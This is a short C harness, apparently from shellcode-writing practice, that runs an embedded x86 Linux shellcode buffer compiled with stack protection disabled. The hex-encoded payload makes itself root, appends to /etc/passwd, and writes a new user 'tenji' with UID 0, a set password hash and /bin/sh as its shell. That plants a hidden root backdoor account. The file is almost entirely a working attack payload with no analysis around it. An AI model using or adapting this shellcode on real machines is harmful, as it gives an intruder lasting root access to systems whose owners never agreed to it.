/*  
 *   adduserWrapper.c  
 *   By Abatchy  
 *   gcc adduserWrapper.c -fno-stack-protector -z execstack -o adduserWrapper.out  
 *   */  
  
#include <stdio.h>  
#include <string.h>  

unsigned char buf[] = \

"\x31\xc9\x89\xcb\x6a\x46\x58\xcd\x80\x6a\x05\x58\x31\xc9\x51"
"\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63"
"\x89\xe3\x41\xb5\x04\xcd\x80\x93\xe8\x23\x00\x00\x00\x74\x65"
"\x6e\x6a\x69\x3a\x41\x7a\x72\x57\x76\x5a\x57\x70\x49\x71\x69"
"\x62\x2e\x3a\x30\x3a\x30\x3a\x3a\x2f\x3a\x2f\x62\x69\x6e\x2f"
"\x73\x68\x0a\x59\x8b\x51\xfc\x6a\x04\x58\xcd\x80\x6a\x01\x58"
"\xcd\x80";

int main()  
{
	printf("Shellcode size: %d\n", strlen(buf));  
	int (*ret)() = (int(*)())buf;  
	ret();  
}  
  
  
  
  
